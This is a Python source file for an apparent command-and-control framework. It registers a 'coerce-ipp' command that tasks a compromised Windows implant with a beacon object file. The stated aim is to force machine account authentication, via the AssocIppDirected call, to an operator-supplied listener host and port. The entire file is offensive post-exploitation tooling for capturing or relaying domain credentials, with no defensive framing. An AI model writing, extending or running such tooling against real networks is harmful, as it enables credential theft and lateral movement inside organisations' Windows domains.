import asyncio
import logging
import sys

from oc2_sdk_python.application import Application
from oc2_sdk_python.command import (
    CommandContext,
    CommandSupport,
    DefaultArgumentParser,
    command,
)
from oc2_sdk_python.logging import configure_logging
from oc2_sdk_python.task import TaskArgument
from oc2_sdk_python.types import Architecture, OperatingSystem


DESCRIPTION = "Coerce machine account authentication via AssocIppDirected"


def bof_name_for_architecture(architecture: Architecture | None) -> str:
    if architecture == Architecture.INTEL_X64:
        return "coerce_ipp_bof_x64"
    if architecture == Architecture.INTEL_X86:
        return "coerce_ipp_bof_x86"
    raise ValueError(f"Unsupported implant architecture: {architecture}")


def build_coerce_ipp_parser() -> DefaultArgumentParser:
    parser = DefaultArgumentParser(
        prog="coerce-ipp",
        description=DESCRIPTION,
        epilog="Example: coerce-ipp 127.0.0.1 8082",
    )
    parser.add_argument("host", help="Listener hostname or IP address")
    parser.add_argument("port", type=int, help="Listener TCP port (1-65535)")
    return parser


@command(
    input_schema=build_coerce_ipp_parser().input_schema,
    name="coerce-ipp",
    description=DESCRIPTION,
    support=[
        CommandSupport(OperatingSystem.WINDOWS, Architecture.INTEL_X64),
        CommandSupport(OperatingSystem.WINDOWS, Architecture.INTEL_X86),
    ],
)
async def coerce_ipp(ctx: CommandContext) -> None:
    parser = build_coerce_ipp_parser()
    arguments = await ctx.split_and_parse_arguments(parser=parser)
    if arguments is None:
        return

    if not 1 <= arguments.port <= 65535:
        await ctx.status.failed("Port must be between 1 and 65535.")
        return

    await ctx.schedule_bof(
        bof_name_for_architecture(ctx.implant.architecture_type),
        arguments=[
            TaskArgument.string(arguments.host),
            TaskArgument.int32(arguments.port),
        ],
    )


async def register() -> None:
    """Register the command provider and connect it to OC2."""
    configure_logging(logging.DEBUG)

    app = Application()
    app.command_provider.add_commands_from_module(sys.modules[__name__])
    await app.run()


def main() -> None:
    asyncio.run(register())


if __name__ == "__main__":
    main()
